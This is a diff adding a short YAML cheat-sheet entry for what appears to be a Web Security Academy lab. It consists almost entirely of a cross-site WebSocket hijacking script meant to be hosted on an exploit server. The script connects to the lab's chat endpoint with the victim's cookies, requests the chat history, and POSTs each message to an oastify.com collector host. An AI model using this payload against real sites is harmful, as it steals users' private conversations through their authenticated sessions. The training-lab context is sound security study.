@@ -1,0 +1,23 @@
+name: CSRF voer Websocket to steal chat history
+description: Weak SameSite cookie policy. Host this on the exploit server.
+commands:
+  - command: |
+      <script>
+      let ws = new WebSocket("wss://0a690041049f5154821d60560049000c.web-security-academy.net/chat");
+      ws.onopen = () => {
+        ws.send("READY")
+      }
+
+      ws.onmessage = (e) => {
+        fetch("https://7w4j95gw2b9amvqjwbpfjphbe2kt8kw9.oastify.com", {method:"POST", mode: 'no-cors', body:e.data})
+      }
+      </script>
+    description:
+tags:
+  - csrf
+  - websocket
+show:
+links:
+  -
+references:
+  -
